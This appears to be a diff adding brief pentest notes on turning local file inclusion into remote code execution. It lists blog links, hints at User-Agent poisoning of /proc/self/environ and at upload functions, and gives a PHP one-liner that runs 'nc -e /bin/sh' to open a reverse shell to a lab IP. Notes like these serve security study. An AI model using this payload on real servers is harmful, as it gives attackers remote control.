@@ -1,0 +1,15 @@
+
+https://a3h1nt.medium.com/from-local-file-inclusion-to-reverse-shell-774fe61b7e1e
+/proc/self/eviron -- Useragent reverse shell
+
+<?
+
+passthru(“nc -e /bin/sh 172.16.177.175 69”);
+
+?>
+
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1
+/proc/self/eviron -- Useragent reverse shell
+
+https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2
+Upload functions
